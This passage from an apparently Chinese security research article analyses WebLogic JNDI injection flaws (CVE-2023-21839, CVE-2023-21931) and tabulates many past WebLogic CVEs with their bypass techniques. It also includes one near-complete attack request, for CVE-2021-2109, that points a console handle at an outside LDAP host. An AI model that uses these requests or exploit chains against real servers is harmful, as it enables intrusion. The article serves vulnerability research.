![1686634289_6487ff3190be4d27b9def.png!small?1686634289680](https://image.3001.net/images/20230613/1686634289_6487ff3190be4d27b9def.png!small?1686634289680)

在rebind操作中，已经提前将名称和对象存入了缓存map中，这里调用lookupHere方法就是从map中根据名称查找对象，lookupHere方法如下：

![1686634294_6487ff368d3af8c101c50.png!small?1686634294606](https://image.3001.net/images/20230613/1686634294_6487ff368d3af8c101c50.png!small?1686634294606)

在BasicNamingNode的lookupSharable方法中（如下），调用完lookupHere后调用resolveObject方法。

![1686634299_6487ff3b156c6076ff279.png!small?1686634299244](https://image.3001.net/images/20230613/1686634299_6487ff3b156c6076ff279.png!small?1686634299244)

resolveObject就不展示了，因为没有太大意义，根据利用链，来到WLNamingManager的getObjectInstance方法：

![1686634304_6487ff40b51d6a80f34c3.png!small?1686634305084](https://image.3001.net/images/20230613/1686634304_6487ff40b51d6a80f34c3.png!small?1686634305084)

在这里判断对象是否为OpaqueReference的实例，是的话则调用getReferent方法。

OpaqueReference为接口，它的实现类巨多，其中有一个实现类叫ForeignOpaqueReference类，该类的getReferent方法如下：

![1686634308_6487ff4464595bee46d71.png!small?1686634308529](https://image.3001.net/images/20230613/1686634308_6487ff4464595bee46d71.png!small?1686634308529)

会根据remoteJNDIName属性的值去进行lookup，造成JNDI注入。

## CVE-2023-21931

### 分析

该漏洞与上一个漏洞相似，也是先rebind，再lookup，只是rebind的对象类型不同。

不同点位于WLNamingManager的getObjectInstance方法：

![1686634314_6487ff4a6e354d07efe4f.png!small?1686634314765](https://image.3001.net/images/20230613/1686634314_6487ff4a6e354d07efe4f.png!small?1686634314765)

这里绑定的对象若为LinkRef的实例的话，会从绑定的对象中获取字符串，然后再使用该字符串进行lookup，造成JNDI注入。

## 展望

在2023年爆出的两个高危漏洞CVE-2023-21839和CVE-2023-21931能反序列化成功且进行rebind操作，原因就是他们走的是IIOP的反序列化链，IIOP没有白名单，只有黑名单，而ForeignOpaqueReference不在黑名单。

截至到目前2023/06/08，T3协议是已经加了白名单的了，而IIOP依旧是使用黑名单。所以说未来的漏洞应该是偏向于IIOP反序列化攻击，因为T3的白名单绕过麻烦，且难绕。

WebLogic的漏洞挖掘应在以下两个方面：

  1. 通过WebLogic自带的特性寻找漏洞，某些URI可能存在漏洞；

  2. 挖掘IIOP反序列化新链；

二次反序列化已经行不通了，因为WebLogic已经通过JDK
JEP290的特性注册了自己的输入流过滤器，即使是创建原生的ObjectInputStream，也会走黑名单。

IIOP黑名单走IIOPInputStream、T3黑名单走ServerChannelInputStream。

## 总结

WebLogic从诞生之初就有各种各样的漏洞，按漏洞类型分类的话如下：

  * 反序列化漏洞：CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2017-3506、CVE-2017-10271、CVE-2018-2628、CVE-2018-2893、CVE-2018-3191、CVE-2018-3245、CVE-2018-3252、CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650、CVE-2019-2888、CVE-2019-2725、CVE-2019-2729、CVE-2019-2890、CVE-2020-2551、CVE-2020-2555、CVE-2020-2883、CVE-2020-2963、CVE-2020-14644、CVE-2020-14645、CVE-2020-14756、CVE-2020-14825/CVE-2020-14841、CVE-2021-2135、CVE-2021-2394、CVE-2022-21350

  * 文件上传漏洞：CVE-2018-2894、CVE-2019-2618

  * 外部实体注入漏洞：CVE-2018-3246

  * 任意文件读取漏洞：CVE-2019-2615

  * 未授权访问漏洞：CVE-2020-14750、CVE-2020-14882

  * 任意命令执行漏洞：CVE-2020-14883

  * JNDI注入漏洞：CVE-2021-2109、、CVE-2023-21839、CVE-2023-21931

  * 目录穿越漏洞：CVE-2019-2827

反序列化又可以分类成T3协议反序列化、IIOP协议反序列化、XMLDecoder反序列化；

接下来以一个表格来归纳所有漏洞：

CVE| 分类| 描述  
---|---|---  
CVE-2015-4852| T3协议反序列化漏洞|
在InboundMsgAbbrev#readObject处理待反序列化对象，无任何限制，配合CC链直接反序列化造成RCE。  
CVE-2016-0638| T3协议反序列化漏洞|
在StreamMessageImpl的readExternal方法中会创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用这个特性绕过黑名单，配合CC链造成RCE。  
CVE-2016-3510| T3协议反序列化漏洞|
在MarshalledObject的readResolve方法会创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用这个特性绕过黑名单，配合CC链造成RCE。  
CVE-2017-3248| T3协议反序列化漏洞|
RemoteObject的readObject方法的后续操作会发送JRMP请求向指定服务端，可以伪造服务端返回一个CC链封装的恶意对象，造成RCE。  
CVE-2017-3506| XMLDecoder反序列化漏洞| 未对标签做任何限制，使用自定义的XML，反序列化后直接执行命令。  
CVE-2017-10271| XMLDecoder反序列化漏洞|
封禁object标签，可以使用void标签代替来绕过。使用替换后的XML，反序列化后直接执行命令。  
CVE-2018-2628| T3协议反序列化漏洞|
该CVE包含两个漏洞，第一个是使用Activator作为动态代理的接口，配合RemoteObject的readObject向指定JRMP服务端发送请求。第二个是使用StreamMessageImpl绕过黑名单，反序列化DiskFileItem类，配合JDK6空字符截断的特性，写入WebShell。  
CVE-2018-2893| T3协议反序列化漏洞|
使用StreamMessageImpl绕过黑名单，反序列化动态代理类，配合RemoteObject的readObject向指定JRMP服务端发送请求。  
CVE-2018-2894| 文件上传漏洞| /ws_utc/config.do和/ws_utc/begin.do两处URI可未授权直接上传文件。  
CVE-2018-3191| T3协议反序列化漏洞| 直接反序列化JtaTransactionManager，造成JNDI注入。  
CVE-2018-3245| T3协议反序列化漏洞|
RemoteObject的readObject方法的后续操作会发送JRMP请求向指定服务端，可以伪造服务端返回一个CC链封装的恶意对象，造成RCE。  
CVE-2018-3246| 外部实体注入漏洞| 基于文件上传点/ws_utc/begin.do，上传包含外部实体的XML文件造成XXE。  
CVE-2018-3252| 反序列化漏洞|
URI为/bea_wls_deployment_internal/DeploymentService，会根据请求头类型wl_request_type:
data_transfer_request，自动将请求体的内容进行反序列化。反序列化的流为DeploymentObjectInputStream，没有黑名单。  
CVE-2019-2615| 任意文件读取漏洞|
URI为/bea_wls_management_internal2/wl_management，根据adminPath所指定的路径读取系统文件并返回。  
CVE-2019-2618| 文件上传漏洞|
URI为/bea_wls_deployment_internal/DeploymentService，将请求体的内容上传到临时目录下。  
CVE-2019-2647 ~ CVE-2019-2888| T3协议反序列化漏洞|
T3协议反序列化漏洞造成XXE。分别使用到了绕过黑名的类ForeignRecoveryContext、WsrmServerPayloadContext、UnknownMsgHeader、WsrmSequenceContext、EJBTaglibDescriptor。而且都是调用readExternal作为入口点。  
CVE-2019-2725| XMLDecoder反序列化漏洞|
反序列化UnitOfWorkChangeSet类，在其构造函数中，使用第一个方法第一参数字节数组作为源，创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用该特性绕过黑名单，反序列化任意类。  
CVE-2019-2729| XMLDecoder反序列化漏洞|
被封禁的class标签替换成array标签，同时还带上一个method属性。只在JDK6生效。  
CVE-2019-2827| 目录穿越漏洞| 使用两个点的`..`绕过CVE-2019-2618文件上传对于目录穿越修复的绕过。  
CVE-2019-2890| T3协议反序列化漏洞|
在PersistentContext的readSubject，会创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用这个特性绕过黑名单，反序列化任意类。  
CVE-2020-2551| IIOP协议反序列化漏洞| 反序列化JtaTransactionManager造成JNDI注入。  
CVE-2020-2555| T3协议反序列化漏洞| 使用ReflectionExtractor的extract反射调用任意类的任意方法。  
CVE-2020-2883| T3协议反序列化漏洞| 改变链的中间部分，使用ReflectionExtractor的extract反射调用任意类的任意方法。  
CVE-2020-2963| T3协议反序列化漏洞|
在SOAPInvokeState的readExternal，会创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用这个特性绕过黑名单，反序列化任意类。  
CVE-2020-14644| IIOP协议反序列化漏洞|
在调用RemoteConstructor的readResolve后，会经历如下流程：获取RemoteConstructor的m_definition属性（ClassDefinition），再获取ClassDefinition的m_abClass字节数组，转换成类，找到类中的构造函数，再赋值给ClassDefinition的m_mhCtor属性，最后获取该属性，执行该构造函数，触发恶意操作。  
CVE-2020-14645| T3协议反序列化漏洞|
通过UniversalExtractor能反射执行任意类的getter方法的特性，触发JdbcRowSetImpl.getDatabaseMetaData()造成JNDI注入。  
CVE-2020-14750| 未授权访问漏洞| 使用双重URL编码绕过认证直接访问后台。二级目录为/images。  
CVE-2020-14756| T3协议反序列化漏洞|
AttributeHolder.readExternal()作为入口点，最后使用MVEL.executeExpression()执行表达式。  
CVE-2020-14825/CVE-2020-14841| T3协议反序列化漏洞|
利用LockVersionExtractor类能反射执行任意类的getter方法和setter方法的特性，触发JdbcRowSetImpl.getDatabaseMetaData()造成JNDI注入。  
CVE-2020-14882| 未授权访问漏洞| 使用双重URL编码绕过认证直接访问后台。二级目录为/css。  
CVE-2020-14883| 任意命令执行漏洞| 指定handle参数的值为ShellSession，直接执行命令。  
CVE-2021-2109| JNDI注入漏洞|
指定URI为/console/css/%252e%252e%252f/consolejndi.portal，请求体的键JNDIBindingPortlethandle的值为com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.176;1:1389/ikun;AdminServer%22)即可直接造成JNDI注入。  
CVE-2021-2135| T3协议反序列化漏洞|
AttributeHolder.readExternal()作为入口点，中间的链进行了改造，最后使用MVEL.executeExpression()执行表达式。  
CVE-2021-2294| T3协议反序列化漏洞| OraclePooledConnection的readObject往可控地址发送JDBC请求。  
CVE-2021-2394| T3协议反序列化漏洞|
使用AttributeHolder.readExternal()作为入口点，利用FilterExtractor类能反射执行任意类的getter方法的特性，触发JdbcRowSetImpl.getDatabaseMetaData()造成JNDI注入。  
CVE-2022-21350| IIOP协议反序列化漏洞|
BadAttributeValueExpException->SessionData->AttributeWrapperUtils->BusinessHandleImpl->HomeHandleImpl最终造成JNDI注入。  
CVE-2023-21839| JNDI注入漏洞| 先rebind一个ForeignOpaqueReference，再lookup造成JNDI注入。  
CVE-2023-21931| JNDI注入漏洞| 先rebind一个LinkRef，再lookup造成JNDI注入。  
  
完整版在blog：https://windowsdefender.com.cn/2023/06/09/WebLogic/

## Reference

  * [WebLogic 安全研究报告](https://paper.seebug.org/1012/)

  * [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)

  * [中间件基本概念（weblogic）](https://www.modb.pro/db/55882)

  * [Weblogic Analysis Attacked by T3 Protocol From CVE (part 1)](http://tttang.com/archive/1768/#toc__6)

  * [weblogic补丁下载与安装补丁的方法](https://www.cnblogs.com/my-first-blog-lgz/p/14452839.html)

  * [WebLogic优化（10.3.6）](https://blog.csdn.net/yangkei/article/details/128301721)

  * [忆——Weblogic CVE-2016-0638反序列化漏洞](https://www.anquanke.com/post/id/250801#h2-1)

  * [weblogic反序列化漏洞合集](https://forum.butian.net/share/1191)

  * [Java CORBA](https://www.anquanke.com/post/id/199227)

  * [WebLogic CVE-2020-2551漏洞分析](https://paper.seebug.org/1138)

  * [手把手教你解决Weblogic CVE-2020-2551 POC网络问题](https://xz.aliyun.com/t/7498)

  * [Weblogic 未授权命令执行分析复现（CVE-2020-14882/14883）](https://paper.seebug.org/1395/)

  * [How Did I Find Weblogic T3 RCE](https://xz.aliyun.com/t/9068)

  * [Oracle打Patch报错Prerequisite check "CheckActiveFilesAndExecutables" failed.](https://blog.51cto.com/hbxztc/1911276)

  * [Weblogic T3协议白名单绕过方法探索](https://xz.aliyun.com/t/11087)

  * [Weblogic CVE-2020-2551 绕过NAT网络分析](https://xz.aliyun.com/t/11825#toc-4)

  * [如何修改源码>重新打包>替换源文件](https://blog.csdn.net/shiwodecuo/article/details/84656730)

  * [Weblogic IIOP 协议NAT 网络绕过](https://www.r4v3zn.com/posts/144eb4b6/)

